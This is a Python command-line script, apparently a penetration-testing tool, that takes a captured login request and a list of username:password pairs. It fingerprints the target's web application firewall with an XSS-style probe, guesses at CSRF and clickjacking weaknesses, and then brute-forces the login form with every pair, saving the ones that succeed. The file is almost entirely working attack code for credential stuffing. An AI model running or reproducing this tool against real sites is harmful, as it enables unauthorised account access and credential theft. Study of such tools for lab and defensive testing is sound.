##!/usr/bin/env python3
# @faisalfs10x
"""tested on http://vulnweb.lab.rz.my/user/login.php and https://grabme.herokuapp.com/target/
	
	python3 httpwaf.py -r heroku_req.txt -c credpwd.txt -u username -p password -i "incorrect username or password"
	usage: python3 httpwaf.py -r labrz_req.txt -c credpwd.txt -u email -p password -i "User Email doesn't exists."
	python3 httpwaf.py -r smp_req.txt -c credpwd.txt -u txtLogin -p txtPWD -i "Unauthorised access/wrong User ID/wrong password"
"""
from urllib import parse
import argparse, os
import requests
from texttable import Texttable
from colorama import Fore, Back, Style, init
from urllib.request import urlopen
from requests_toolbelt.utils import dump

# Colors
red = '\033[91m'
green = '\033[92m'
white = '\033[97m'
yellow = '\033[93m'
bold = '\033[1m'
end = '\033[0m'

init(autoreset=True)#reset each time
def banner_motd():
	print(Fore.CYAN +Style.BRIGHT +"""                                                                

		by %sintern%s - (%s25/04/2020%s)%s %s 
""" % (bold, red, white, yellow, white, end))

banner_motd()

# argparse must have -r -c -i -u -p arguments
parser = argparse.ArgumentParser(description='Parallel Dictionary Login')
parser.add_argument("-r","--requestfile", required=True, help = "path to requestfile.txt format from burpsuite request intercept is compulsory!!")
parser.add_argument("-c","--credentialfile",required=True, help = "path to credentialfile.txt in pair of username:password format")
parser.add_argument("-u","--userfield", required=True, type = str, help = "username field")
parser.add_argument("-p","--passfield", required=True, type = str, help = "password field")
parser.add_argument("-i","--invmsg", required=True, type = str, default= '' , help = "invalid message in double quoted string")
parser.add_argument("-V",'--version', action='version',
                    version='%(prog)s 1.0')
args = parser.parse_args()

inputreq = args.requestfile
inputcred = args.credentialfile
userfield = args.userfield
passfield = args.passfield
invmsg2 = args.invmsg

#open request file and split each key:value into dict
with open(inputreq, 'r') as headersfile:
	head=headersfile.readlines()
	firstLine = head.pop(0)
	(method, url, version) = firstLine.split()
	datakey = {'method' : method, 'url' : url, 'version' : version}
for h in head:
    h = h.split(': ')
    if len(h) < 2:
        continue
    key=h[0]
    value= h[1].rstrip()
    datakey[key] = value

urll = (datakey["Referer"])
#table
table = Texttable()
table.set_cols_align(["c","l"])
table.set_cols_valign(["t","b"])
table.add_rows([["Url",datakey["Referer"]],["Host", (datakey["Host"])],["Method",(datakey["method"])],["User-Agent", (datakey["User-Agent"])],
				["Cookie", (datakey["Cookie"])],["Userfield", userfield],["Passfield", passfield],["Invalid msg", invmsg2],
				["Credfile", inputcred],["Requestfile", inputreq]])
print (table.draw())

print(Style.BRIGHT +Fore.YELLOW+"     [#]--------------- Got Protection(?) ---------------[#]")
#payload dictionary
with open(inputreq) as query_string:
    lines = query_string.readlines()
    qstr = lines[lines.index("\n")+1].rstrip()
    p2 = (dict(parse.parse_qsl(parse.urlsplit(qstr).path)))

#fingerprint protection?
new_req = requests.get(urll)
resp_head = dump.dump_all(new_req) 
#print(new_req.request.body)
#print(new_req.request.headers)
#print(resp_head)
if b"cloudflare" in resp_head:
	print ('\033[1;31m     [-]\033[0m  Target is protected by Cloudflare 		 \033[1;31m[-]')
if b"x-frame-options" not in resp_head or b"X-FRAME-OPTIONS" not in resp_head:
	print ('\033[1;32m     [+]\033[0m  Clickjacking Vulnerability found(?)  	 	 \033[1;32m[+]')

read_resp = requests.get(urll, headers={'User-Agent': 'Mozilla/5.0'}).text	
#print(read_resp)
if 'type="hidden"' in read_resp:
	print('\033[1;31m     [-]\033[0m  hmmm, Site has CSRF protection(?)              \033[1;31m[-]')
else:
	print('\033[1;32m     [+]\033[0m  CSRF vuln found(?)                             \033[1;32m[+]')

#https://github.com/0xInfection/Awesome-WAF#detection-techniques
test_waf = "?=<script>alert()</script>" #common payload for WAF rules
fuzz = urll + test_waf
stat_waf = requests.get(fuzz)
#print(stat_waf)
if stat_waf.status_code == 406 or stat_waf.status_code == 501 or b"Mod_Security" in resp_head or b"mod_security" in resp_head: #if the http response code is 406/501
    print("\033[1;31m     [-]\033[1;m  WAF Detected : Mod_Security")
elif stat_waf.status_code == 999 or b"WebKnight" in resp_head: #if the http response code is 999
    print("\033[1;31m     [-]\033[1;m  WAF Detected : WebKnight")
elif stat_waf.status_code == 419: #if the http response code is 419
    print("\033[1;31m     [-]\033[1;m  WAF Detected : F5 BIG IP")
elif b"cloudflare" in resp_head or b"__cfuid" in resp_head or b"cf-ray" in resp_head:
	print("\033[1;31m     [-]\033[1;m  WAF Detected : Cloudflare 			 \033[1;31m[-]")
elif b"FORTIWAFSID=" in resp_head or b"fortiwafsid=" in resp_head:
	print("\033[1;31m     [-]\033[1;m  WAF Detected : FortiWeb")
elif b"Incapsula" in resp_head:
	print("\033[1;31m     [-]\033[1;m  WAF Detected : Imperva Incapsula")
elif b"GoDaddy" in resp_head:
	print("\033[1;31m     [-]\033[1;m  WAF Detected : GoDaddy")
elif b"X-Powered-By: ASP.NET" in resp_head or b"X-ASPNET-Version" in resp_head :
	print("\033[1;31m     [-]\033[1;m  WAF Detected : ASP.NET Generic          	 \033[1;31m[-]")
elif stat_waf.status_code == 403: #if the http response code is 403
    print("\033[1;31m     [-]\033[1;m  Unknown WAF Detected")
else:
	print("\033[1;31m     [-]\033[1;m  WAF could't be determined 		 	 \033[1;31m[-]")
print()

#open credential file and read username:password format
total_try = 0
total_success = 0
with open(inputcred,'r') as cred:
	for details in cred:
		login_info = details.split(':')
		username = login_info[0].strip()
		password = login_info[1].strip()
		
		pload={userfield:username,
		      passfield:password}

		#merge 2 dict into 1 dict
		payload = {**p2 , **pload}
		
		urll = (datakey["Referer"])

		cookies = dict(cookies_are= (datakey["Cookie"]))
		
		headers = datakey.copy()
		headers.pop("Cookie")

		#Custom Headers
		"""
		headers = {'Host': (datakey["Host"]), 
		'User-Agent': (datakey["User-Agent"]), 
		'Method': (datakey["method"]), 
		'Content-Type': (datakey["Content-Type"]), #'Cookie': (datakey["Cookie"]),
		'Accept': (datakey["Accept"]),'Accept-Language': (datakey["Accept-Language"]),'Accept-Encoding': (datakey["Accept-Encoding"]),'Content-Length': (datakey["Content-Length"]),'DNT': (datakey["DNT"]),
		'Connection': (datakey["Connection"]),'Referer': (datakey["Referer"]),'Upgrade-Insecure-Requests': (datakey["Upgrade-Insecure-Requests"]),
		'version': (datakey["version"]), 'url': (datakey["url"]), 		
		}"""

#requests session. Create its own session instance (useful for multiple requests to the same site):
		
		with requests.Session() as session:
			http = session.post(urll, headers=headers, data=payload, cookies=cookies)
			content=http.text
			total_try += 1
			
			if invmsg2 in content:
				print("     [-] nopee:- " +username+ " : "+password)
				
			else:
				print(Fore.LIGHTGREEN_EX +Style.BRIGHT +"     [+]====voilaa: ["+username+ "]::[" +password+"]====[+]")
				total_success += 1
				result ="user: "+username+" and password: "+password

				outputfile = "outputresult.txt"
				with open(outputfile, "a+") as output:
					output.write(result + '\n')
				
print()
print(Style.BRIGHT +Fore.CYAN+"     [+] Credential found : "+str(total_success)+"/" +str(total_try)+" [+]")	

if total_success == 0:
	print(Style.BRIGHT +Fore.RED+"     [-]   No credential match   [-]")
else:
	print(Style.BRIGHT +Fore.YELLOW+"     [+] Creds saved to "+outputfile+" [+]")
exit()
